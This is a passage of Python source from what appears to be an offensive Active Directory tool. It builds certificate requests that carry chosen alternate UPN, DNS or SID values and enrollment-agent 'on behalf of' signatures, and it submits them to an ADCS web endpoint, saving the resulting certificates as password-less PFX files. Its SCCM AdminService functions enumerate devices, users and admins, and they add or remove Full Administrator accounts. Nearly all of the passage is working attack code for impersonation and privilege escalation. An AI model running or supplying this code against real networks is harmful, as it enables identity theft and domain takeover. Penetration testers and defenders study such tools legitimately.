		cri_attributes.append(asn1csr.CRIAttribute({"type": "1.3.6.1.4.1.311.13.1", "values": asn1x509.SetOf([asn1x509.Certificate.load(renewalCert.public_bytes(serialization.Encoding.DER))], spec = asn1x509.Certificate)}))

	# Add Microsoft Application Policies (Windows-specific)
	if applicationPoliciesOID:
		# Convert each policy OID string to asn1x509.PolicyIdentifier
		application_policy_oids = [asn1x509.PolicyInformation({'policy_identifier': asn1x509.PolicyIdentifier(ap)}) for ap in applicationPoliciesOID]

		# Convert CertificatePolicies to a DER-encoded byte string
		cert_policies = asn1x509.CertificatePolicies(application_policy_oids)
		der_encoded_cert_policies = cert_policies.dump()
		
		app_policy_extension = asn1x509.Extension(
			{
				"extn_id": "1.3.6.1.4.1.311.21.10",  # OID for Microsoft Application Policies
				"critical": False,
				"extn_value": asn1x509.ParsableOctetString(der_encoded_cert_policies)
			}
		)

		set_of_extensions = asn1csr.SetOfExtensions([[app_policy_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)
	
	certification_request_info["attributes"] = cri_attributes

	signature = key.sign(certification_request_info.dump(), paddingASYM.PKCS1v15(), hashes.SHA256())

	csr = asn1csr.CertificationRequest({"certification_request_info": certification_request_info, "signature_algorithm": asn1csr.SignedDigestAlgorithm({"algorithm": "sha256_rsa"}), "signature": signature})

	return (x509.load_der_x509_csr(csr.dump()), key)

def createRenewal(request, cert, key):
	x509_cert = asn1x509.Certificate.load(cert.public_bytes(serialization.Encoding.DER))
	signature_hash_algorithm = cert.signature_hash_algorithm.__class__

	# SignerInfo

	issuer_and_serial = asn1cms.IssuerAndSerialNumber({"issuer": x509_cert.issuer, "serial_number": x509_cert.serial_number})
	digest_algorithm = asn1cms.DigestAlgorithm({"algorithm": signature_hash_algorithm.name})
	signed_attribs = asn1cms.CMSAttributes([asn1cms.CMSAttribute({"type": "1.3.6.1.4.1.311.13.1", "values": asn1cms.SetOfAny([asn1x509.Certificate.load(cert.public_bytes(serialization.Encoding.DER))], spec = asn1x509.Certificate)}), asn1cms.CMSAttribute({"type": "message_digest", "values": [hashDigest(request, signature_hash_algorithm)]})])
	attribs_signature = key.sign(signed_attribs.dump(), paddingASYM.PKCS1v15(), signature_hash_algorithm())
	signer_info = asn1cms.SignerInfo({"version": 1, "sid": issuer_and_serial, "digest_algorithm": digest_algorithm, "signature_algorithm": x509_cert["signature_algorithm"], "signature": attribs_signature, "signed_attrs": signed_attribs})

	# SignedData

	content_info = asn1cms.EncapsulatedContentInfo({"content_type": "data", "content": request})
	signed_data = asn1cms.SignedData({"version": 3, "digest_algorithms": [digest_algorithm], "encap_content_info": content_info, "certificates": [asn1cms.CertificateChoices({"certificate": x509_cert})], "signer_infos": [signer_info]})

	# CMC

	cmc = asn1cms.ContentInfo({"content_type": "signed_data", "content": signed_data})

	return cmc.dump()

def createOnBehalfOf(request, onBehalfOf, cert, key):
	x509_cert = asn1x509.Certificate.load(cert.public_bytes(serialization.Encoding.DER))
	signature_hash_algorithm = cert.signature_hash_algorithm.__class__

	# SignerInfo

	issuer_and_serial = asn1cms.IssuerAndSerialNumber({"issuer": x509_cert.issuer, "serial_number": x509_cert.serial_number})
	digest_algorithm = asn1cms.DigestAlgorithm({"algorithm": signature_hash_algorithm.name})
	requester_name = EnrollmentNameValuePair({"name": "requestername\x00", "value": onBehalfOf if onBehalfOf[-1] == "\x00" else onBehalfOf + "\x00",})
	signed_attribs = asn1cms.CMSAttributes([asn1cms.CMSAttribute({"type": "1.3.6.1.4.1.311.13.2.1", "values": [requester_name]}), asn1cms.CMSAttribute({"type": "message_digest", "values": [hashDigest(request, signature_hash_algorithm)]})])
	attribs_signature = key.sign(signed_attribs.dump(), paddingASYM.PKCS1v15(), signature_hash_algorithm())
	signer_info = asn1cms.SignerInfo({"version": 1, "sid": issuer_and_serial, "digest_algorithm": digest_algorithm, "signature_algorithm": x509_cert["signature_algorithm"], "signature": attribs_signature, "signed_attrs": signed_attribs})

	# SignedData

	content_info = asn1cms.EncapsulatedContentInfo({"content_type": "data", "content": request})
	signed_data = asn1cms.SignedData({"version": 3, "digest_algorithms": [digest_algorithm], "encap_content_info": content_info, "certificates": [asn1cms.CertificateChoices({"certificate": x509_cert})], "signer_infos": [signer_info]})

	# CMC

	cmc = asn1cms.ContentInfo({"content_type": "signed_data", "content": signed_data})

	return cmc.dump()

def getObjectSIDFromCertificate(cert):
	try:
		objectSID = cert.extensions.get_extension_for_oid(NTDS_CA_SECURITY_EXT)
		sid = objectSID.value.value
		return sid[sid.find(b"S-1-5"):].decode()
	except:
		pass

	return None

def DERToPEM(der: bytes, pemType: str) -> bytes:
	pemType = pemType.upper()
	b64_data = base64.b64encode(der).decode()
	return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (
		pemType,
		"\n".join([b64_data[i : i + 64] for i in range(0, len(b64_data), 64)]),
		pemType,
	)

def getError(errorCode):
	errorCode &= 0xFFFFFFFF
	if errorCode in ErrorsUtil.HRESULT_ERROR_MESSAGES:
		error_msg_short = ErrorsUtil.HRESULT_ERROR_MESSAGES[errorCode][0]
		error_msg_verbose = ErrorsUtil.HRESULT_ERROR_MESSAGES[errorCode][1]
		return "[-] Got error: 0x%x - %s - %s" % (errorCode, error_msg_short, error_msg_verbose)
	else:
		return "[-] Got error: 0x%x. Check MS-ERREF" % errorCode

def requestCertificate(session, target, proxy, user, templateName, caName, outFile, renew = False, onBehalfOf = None, pfxFile = None, pfxPwd = None, subject = None, altDNS = None, altUPN = None, altSID = None, archiveKey = False, keySize = 2048, applicationPolicies = None):
	print_yellow("[*] Requesting ADCS certificate")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return

		if (not templateName or not caName or not outFile):
			print("[-] Template name, CA name and output file name required")
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}
	
		# Create the Certificate Signing Request (CSR)

		if onBehalfOf:
			username = onBehalfOf
		else:
			username = user.upper()
		
		renewalCert = None
		renewalKey = None
		if renew:
			if pfxFile is None:
				print(f"[-] PFX certificate not provided for renewal")
				return
			with open(pfxFile, "rb") as f:
				renewalKey, renewalCert = serialization.pkcs12.load_key_and_certificates(f.read(), pfxPwd)
		
		applicationPoliciesOID = None
		if applicationPolicies:
			applicationPoliciesOID = []
			applicationPolicies = applicationPolicies.split(',')
			for policy in applicationPolicies:
				oid = next((k for k, v in LDAPUtil.OID_TO_STR_MAP.items() if v.lower() == policy.lower()), policy)
				applicationPoliciesOID.append(oid)

		csr, key = createCSR(username, altDNS = altDNS, altUPN = altUPN, altSID = altSID, key = None, keySize = keySize, subject = subject, renewalCert = renewalCert, applicationPoliciesOID = applicationPoliciesOID)
		csr = csr.public_bytes(serialization.Encoding.DER)
		
		if archiveKey:
			print("[-] TODO")
			return
		
		if renew:
			csr = createRenewal(csr, renewalCert, renewalKey)
		
		if onBehalfOf:
			if pfxFile is None:
				print(f"[-] PFX certificate not provided for request on behalf of another user")
				return
			with open(pfxFile, "rb") as f:
				agentKey, agentCert = serialization.pkcs12.load_key_and_certificates(f.read(), pfxPwd)[:-1]
			csr = createOnBehalfOf(csr, onBehalfOf, agentCert, agentKey)
		
		# Create the attributes

		attributes = [f"CertificateTemplate:{templateName}"]
		if altUPN or altDNS:
			san = []
			if altDNS:
				san.append(f"dns={altDNS}")
			if altUPN:
				san.append(f"upn={altUPN}")
			attributes.append("SAN:%s" % "&".join(san))
		if applicationPoliciesOID:
			policyString = "&".join(applicationPoliciesOID)
			attributes.append(f"ApplicationPolicies:{policyString}")

		# Request the certificate through HTTP

		csr = DERToPEM(csr, "CERTIFICATE REQUEST")
		attributes = "\n".join(attributes)

		url = f"{target}/certsrv/certfnsh.asp"
		body = {
			"Mode": "newreq",
			"CertAttrib": attributes,
			"CertRequest": csr,
			"TargetStoreFlags": "0",
			"SaveCert": "yes",
			"ThumbPrint": "",
		}

		print(f"[+] Requesting certificate to {url}")
		res = session.post(url, verify = False, data = body, proxies = proxies)

		if res.status_code != 200: # Failed to request certificate
			print("[-] Failed to request certificate", file = sys.stderr)
			print("[+] Printing raw response", file = sys.stderr)
			print("-------------------------", file = sys.stderr)
			printRawResponse(res, file = sys.stderr)
			return

		# Check for request ID

		content = res.text
		requestID = re.findall(r"certnew.cer\?ReqID=([0-9]+)&", content)
		if not requestID:
			if "template that is not supported" in content:
				print(f"[-] Template {templateName} not supported by {caName}", file = sys.stderr)
				return
		
			requestID = re.findall(r"Your Request Id is ([0-9]+)", content)
			if len(requestID) != 1:
				print("[-] Failed to get request ID from response")
				requestID = None
			else:
				requestID = int(requestID[0])
				print(f"[+] Request ID = {requestID}")
			
			if "Certificate Pending" in content:
				print("[-] Certificate request is pending approval", file = sys.stderr)
			elif '"Denied by Policy Module"' in content:
				res = session.get(f"{target}/certsrv/certnew.cer?ReqID={requestID}", verify = False, proxies = proxies)
				errorCodes = re.findall("(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ", res.text, flags = re.MULTILINE)
				errorCode = int(errorCodes[0], 16)
				print(getError(errorCode), file = sys.stderr)
			else:
				errorCodes = re.findall(r"Denied by Policy Module  (0x[0-9a-fA-F]+),", content)
				errorCode = int(errorCodes[0], 16)
				print(getError(errorCode), file = sys.stderr)

			if requestID == None:
				with open(f"{requestID}.key", "wb") as f:
					keyPEM = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, encryption_algorithm = serialization.NoEncryption())
					f.write(keyPEM)
					print(f"[+] Saved PEM private key to {outFile.split('.')[0]}.key")
				return

		if len(requestID) == 0:
			print("[-] Failed to get request ID from response")
			requestID = None
		else:
			requestID = int(requestID[0])
			print(f"[+] Request ID = {requestID}")
		
		if requestID == None:
			with open(f"{requestID}.key", "wb") as f:
				keyPEM = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, encryption_algorithm = serialization.NoEncryption())
				f.write(keyPEM)
				print(f"[+] Saved PEM private key to {outFile.split('.')[0]}.key")
			return
		
		# Retrieve the certificate

		url = f"{target}/certsrv/certnew.cer?ReqID={requestID}"
		print(f"[+] Retrieving the certificate to {url}")
		res = session.get(url, verify = False, proxies = proxies)

		if res.status_code != 200:
			print("[-] Failed to retrieve certificate", file = sys.stderr)
			print("[+] Printing raw response", file = sys.stderr)
			print("-------------------------", file = sys.stderr)
			printRawResponse(res, file = sys.stderr)
			return
		
		if not b"BEGIN CERTIFICATE" in res.content:
			content = res.text
			if "Taken Under Submission" in content:
				print("[-] Certificate request is pending approval", file = sys.stderr)
			elif "The requested property value is empty" in content:
				print(f"[-] Unknown request ID {requestID}")
			else:
				errorCodes = re.findall(r" (0x[0-9a-fA-F]+) \(", content)
				errorCode = int(errorCodes[0], 16)
				print(getError(errorCode), file = sys.stderr)
			return
		
		cert = x509.load_pem_x509_certificate(res.content)

		if subject:
			subject = ",".join(map(lambda x: x.rfc4514_string(), cert.subject.rdns))
			print(f"[+] Got certificate with subject = {subject}")

		objectSID = getObjectSIDFromCertificate(cert)
		if objectSID is not None:
			print(f"[+] Certificate object SID = {repr(objectSID)}")
		else:
			print("[+] Certificate has no object SID")

		pfx = serialization.pkcs12.serialize_key_and_certificates(name = b"", key = key, cert = cert, cas = None, encryption_algorithm = serialization.NoEncryption())
		with open(outFile, "wb") as f:
			f.write(pfx)

		print(f"[+] Saved PFX certificate and private key to '{outFile}' (No password)")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#########################################################
#                     SCCM / MECM                       #
#########################################################

### Enumerate ###

def printDevice(device, indent):
	active = device['Active']
	if active == None or active == 0:
		active = 'NotActive'
	else:
		active = 'Active'

	client = device['Client']
	if client == None or client == 0:
		client = 'NotClient'
	else:
		client = 'Client'

	SMSUniqueIdentifier = device['SMSUniqueIdentifier']
	if SMSUniqueIdentifier != None:
		SMSUniqueIdentifier = SMSUniqueIdentifier.split('GUID:')[1]

	print("\t" * indent + f"[+] {device['Name']}:{active}:{client}:{device['DistinguishedName']}:{device['FullDomainName']}:{device['IPAddresses']}:"
	   		f"{device['LastLogonUserDomain']}/{device['LastLogonUserName']}:{device['OperatingSystemNameandVersion']}:{device['PrimaryGroupID']}:{device['ResourceId']}:"
			f"{device['ResourceNames']}:{device['SID']}:{device['SMSInstalledSites']}:{SMSUniqueIdentifier}")

def printUser(user, indent):
	print("\t" * indent + f"[+] {user['UserName']}:{user['FullDomainName']}/{user['FullUserName']}:{user['DistinguishedName']}:{user['UserPrincipalName']}:{user['UniqueUserName']}:"
	   		f"{user['Mail']}:{user['SID']}:{user['UserAccountControl']}:{user['ResourceId']}")

def printPrimaryUser(puser, indent):
	active = puser['IsActive']
	if active == None or active == 0:
		active = 'NotActive'
	else:
		active = 'Active'

	print("\t" * indent + f"[+] {puser['UniqueUserName']}:{active}:{puser['ResourceName']}:{puser['ResourceID']}:{puser['RelationshipResourceID']}")

def printCollection(collection, indent):
	builtin = collection['IsBuiltIn']
	if builtin == None or builtin == 0:
		builtin = 'NotBuiltIn'
	else:
		builtin = 'BuiltIn'

	print("\t" * indent + f"[+] {collection['Name']}:{builtin}:{collection['CollectionID']}:{collection['CollectionType']}:{collection['LimitToCollectionName']}:{collection['MemberClassName']}:{collection['MemberCount']}")

def getDevice(session, target, proxy, deviceName):
	print_yellow("[*] Searching SCCM Device")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return

		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_R_System?$filter=Name eq '{deviceName}' "
		res = session.get(endpoint, verify = False, proxies = proxies).json()
		found = False
		for device in res["value"]:
			if device['Name'].lower() == deviceName.lower():
				found = True
				print(f"[+] SCCM Device '{deviceName}' found")
				print(f"\t[+] Name:IsActive:IsClient:DistinguishedName:FullDomainName:IPAddresses:LastLogonUserDomain/LastLogonUserName:OperatingSystemNameandVersion:PrimaryGroupID:ResourceID:ResourceNames:SID:SMSInstalledSites:SMSUniqueIdentifier")
				printDevice(device, 1)
				return device

		if not found:
			print(f"[-] SCCM Device '{deviceName}' not found", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

def getLastLogonUser(session, target, proxy, lastLogonUserName):
	print_yellow("[*] Searching last logon of user on SCCM Devices")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_R_System?$filter=lastLogonUserName eq '{lastLogonUserName}' "
		res = session.get(endpoint, verify = False, proxies = proxies).json()
		found = False
		for device in res["value"]:
			if device['lastLogonUserName'].lower() == lastLogonUserName.lower():
				found = True
				print(f"[+] User '{lastLogonUserName}' found connected to SCCM Device '{device['Name']}'")
				print(f"\t[+] Name:IsActive:IsClient:DistinguishedName:FullDomainName:IPAddresses:LastLogonUserDomain/LastLogonUserName:OperatingSystemNameandVersion:PrimaryGroupID:ResourceId:ResourceNames:SID:SMSInstalledSites:SMSUniqueIdentifier")
				printDevice(device, 1)
				return device

		if not found:
			print(f"[-] User '{lastLogonUserName}' not found connected on any SCCM devices", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

def getUser(session, target, proxy, userName):
	print_yellow("[*] Searching SCCM User")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_R_User?$filter=UserName eq '{userName}' "
		res = session.get(endpoint, verify = False, proxies = proxies).json()
		found = False
		for user in res["value"]:
			if user['UserName'].lower() == userName.lower():
				found = True
				print(f"[+] SCCM User '{userName}' found")
				print(f"\t[+] Name:FullDomainName/FullUserName:DistinguishedName:UserPrincipalName:UniqueUserName:Mail:SID:UserAccountControl:ResourceId")
				printUser(user, 1)
				return user

		if not found:
			print(f"[-] SCCM User '{userName}' not found", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

def getPrimaryUser(session, target, proxy, primaryUserName):
	print_yellow("[*] Searching SCCM Primary User")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_UserMachineRelationship?$filter=endswith(UniqueUsername, '{primaryUserName}') "
		res = session.get(endpoint, verify = False, proxies = proxies).json()
		found = False
		for puser in res["value"]:
			if len(puser['UniqueUserName']) > 1:
				if puser['UniqueUserName'].lower() == primaryUserName.lower():
					found = True
					print(f"[+] SCCM Primary User '{primaryUserName}' found")
					print(f"\t[+] UniqueUserName:IsActive:ResourceName:ResourceID:RelationshipResourceID")
					printPrimaryUser(puser, 1)
					return puser

		if not found:
			print(f"[-] SCCM Primary User '{primaryUserName}' not found", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

def getCollection(session, target, proxy, collectionName):
	print_yellow("[*] Searching SCCM Collection")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_Collection?$filter=Name eq '{collectionName}' "
		res = session.get(endpoint, verify = False, proxies = proxies).json()
		found = False
		for collection in res["value"]:
			if collection['Name'].lower() == collectionName.lower():
				found = True
				print(f"[+] SCCM Collection '{collectionName}' found")
				print(f"\t[+] Name:IsBuiltIn:CollectionID:CollectionType:LimitToCollectionName:MemberClassName:MemberCount")
				printCollection(collection, 1)
				return collection

		if not found:
			print(f"[-] SCCM Collection '{collectionName}' not found", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

def getCollectionMembers(session, target, proxy, collectionID):
	print_yellow("[*] Searching members of SCCM Collection")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_CollectionMember_a?$filter=CollectionID eq '{collectionID}'"
		res = session.get(endpoint, verify = False, proxies = proxies)
		if res.status_code == 200:
			data = res.json()
			if isinstance(data['value'], list):
				name_data = [{'Name': item['Name']} for item in data['value']]
				tb = dp.DataFrame(name_data)
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			else:
				tb = dp.DataFrame(data['value']['Result'])
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			if result == '':
				print(f"[+] SCCM Collection ID '{collectionID}' have no members or does not exist")
			else:
				print(result)
		else:
			print(f"[-] Failed to request members of SCCM Collection ID '{collectionID}'", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def enumSCCM(session, target, proxy):
	print_yellow("[*] Enumerating SCCM")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		# Devices
		print(f"[+] Searching SCCM Devices")
		endpoint = f"{target}/AdminService/wmi/SMS_R_System"
		res = session.get(endpoint, verify = False, proxies = proxies)
		if (res.status_code != 200):
			print(f"\t[-] Failed to request endpoint", file = sys.stderr)
		else:
			res = res.json()
			if len(res['value']) > 0:
				print(f"\t[+] Name:IsActive:IsClient:DistinguishedName:FullDomainName:IPAddresses:LastLogonUserDomain/LastLogonUserName:OperatingSystemNameandVersion:PrimaryGroupID:ResourceID:ResourceNames:SID:SMSInstalledSites:SMSUniqueIdentifier")
				for device in res["value"]:
					printDevice(device, 1)
			else:
				print(f"\t[-] No SCCM Device found", file = sys.stderr)

		# Users
		print(f"[+] Searching SCCM Users")
		endpoint = f"{target}/AdminService/wmi/SMS_R_User"
		res = session.get(endpoint, verify = False, proxies = proxies)
		if (res.status_code != 200):
			print(f"\t[-] Failed to request endpoint", file = sys.stderr)
		else:
			res = res.json()
			if len(res['value']) > 0:
				print(f"\t[+] Name:FullDomainName/FullUserName:DistinguishedName:UserPrincipalName:UniqueUserName:Mail:SID:UserAccountControl:ResourceId")
				for user in res["value"]:
					printUser(user, 1)
			else:
				print(f"\t[-] No SCCM Users found", file = sys.stderr)

		# Primary Users
		print(f"[+] Searching SCCM Primary Users")
		endpoint = f"{target}/AdminService/wmi/SMS_UserMachineRelationship"
		res = session.get(endpoint, verify = False, proxies = proxies)
		if (res.status_code != 200):
			print(f"\t[-] Failed to request endpoint", file = sys.stderr)
		else:
			res = res.json()
			if len(res['value']) > 0:
				print(f"\t[+] UniqueUserName:IsActive:ResourceName:ResourceID:RelationshipResourceID")
				for puser in res["value"]:
					printPrimaryUser(puser, 1)
			else:
				print(f"\t[-] No SCCM Primary User found", file = sys.stderr)

		# Collections
		print(f"[+] Searching SCCM Collections")
		endpoint = f"{target}/AdminService/wmi/SMS_Collection"
		res = session.get(endpoint, verify = False, proxies = proxies)
		if (res.status_code != 200):
			print(f"\t[-] Failed to request endpoint", file = sys.stderr)
		else:
			res = res.json()
			if len(res['value']) > 0:
				print(f"\t[+] Name:IsBuiltIn:CollectionID:CollectionType:LimitToCollectionName:MemberClassName:MemberCount")
				for collection in res["value"]:
					printCollection(collection, 1)
			else:
				print(f"\t[-] No SCCM Collection found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getAdmins(session, target, proxy):
	print_yellow("[*] Listing SMS Admins of SCCM")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_Admin?$filter=RoleNames/any(role: role eq 'Full Administrator')&$select=LogonName"
		res = session.get(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 200:
			data = res.json()
			if data:
				admins = data['value']
				for i in admins:
					print(f"[+] {i['LogonName']}")
			else:
				print("[+] No SMS Admins")
		else:
			print("[-] Failed to list SMS Admins", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getRBAC(session, target, proxy):
	print_yellow("[*] Listing RBAC of SCCM users")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames"
		res = session.get(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 200:
			data = res.json()
			if isinstance(data['value'], list):
				tb = dp.DataFrame(data['value'])
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			else:
				tb = dp.DataFrame(data['value']['Result'])
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			if result == '':
				print("[+] No data available")
			else:
				print(result)
		else:
			print("[-] Failed to request RBAC", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getConsoleConnections(session, target):
	print_yellow("[*] Listing console connections on SCCM clients")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return

		endpoint = f"{target}/AdminService/wmi/SMS_ConsoleAdminsData?$select=UserName,MachineName,Source,ConsoleVersion"
		res = requests.get(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'})
		if res.status_code == 200:
			data = res.json()
			if isinstance(data['value'], list):
				tb = dp.DataFrame(data['value'])
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			else:
				tb = dp.DataFrame(data['value']['Result'])
				result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
			if result == '':
				print("[+] No data available")
			else:
				print(result)
		else:
			print("[-] Failed to request console connections", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

### SMS Admin ###

def addAdmin(session, target, proxy, sam, sid):
	print_yellow("[*] Adding account to SMS Admin of SCCM")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		body = {"LogonName": sam, "AdminSid": sid,
			"Permissions":[{"CategoryID": "SMS00ALL",
							"CategoryTypeID": 29,
							"RoleID":"SMS0001R",
							},
							{"CategoryID": "SMS00001",
							"CategoryTypeID": 1,
							"RoleID":"SMS0001R",
							},
							{"CategoryID": "SMS00004",
							"CategoryTypeID": 1,
							"RoleID":"SMS0001R",
							}],
			"DisplayName": sam
			}
		endpoint = f"{target}/AdminService/wmi/SMS_Admin/"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies)
		if res.status_code == 201:
			print(f"[+] Successfully added '{sam}' as SMS Admin")
		else:
			print(f"[-] Failed to add '{sam}' as SMS Admin", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def deleteAdmin(session, target, proxy, sam):
	print_yellow("[*] Removing account SMS Admin of SCCM")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		print(f"[+] Retrieving AdminID of '{sam}'")

		adminID = ''
		endpoint = f"{target}/AdminService/wmi/SMS_Admin/?$filter=LogonName eq '{sam}'"
		res = session.get(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 200:
			data = res.json()
			if len(data['value']) == 0:
					print(f"\t[-] Target user '{sam}' is not configured as an SMS Admin", file = sys.stderr)
					return
			else:
				adminID = data['value'][0]['AdminID']
		if adminID == '':
			print("\t[-] Failed to retrieve AdminID", file = sys.stderr)
			return
		else:
			print(f"\t[+] AdminID = {adminID}")

		print(f"[+] Removing '{adminID}' as SMS Admin")

		endpoint = f"{target}/AdminService/wmi/SMS_Admin({adminID})"
		res = session.delete(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 204:
			print(f"\t[+] Account successfully removed")
		else:
			print(f"\t[-] Failed to remove account", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

### Policies ###

class POLICY_FLAGS(enum.IntFlag):
	TASKSEQUENCE                = 0b0000001
	REQUIRESAUTH                = 0b0000010
	SECRET                      = 0b0000100
	INTRANETONLY                = 0b0001000
	PERSISTWHOLEPOLICY          = 0b0010000
	AUTHORIZEDDYNAMICDOWNLOAD   = 0b0100000
	COMPRESSED                  = 0b1000000

POLICY_FLAGS_MAP = {
	"TASKSEQUENCE": POLICY_FLAGS.TASKSEQUENCE,
	"REQUIRESAUTH": POLICY_FLAGS.REQUIRESAUTH,
	"SECRET": POLICY_FLAGS.SECRET,
	"INTRANETONLY": POLICY_FLAGS.INTRANETONLY,
	"PERSISTWHOLEPOLICY": POLICY_FLAGS.PERSISTWHOLEPOLICY,
	"AUTHORIZEDDYNAMICDOWNLOAD": POLICY_FLAGS.AUTHORIZEDDYNAMICDOWNLOAD,
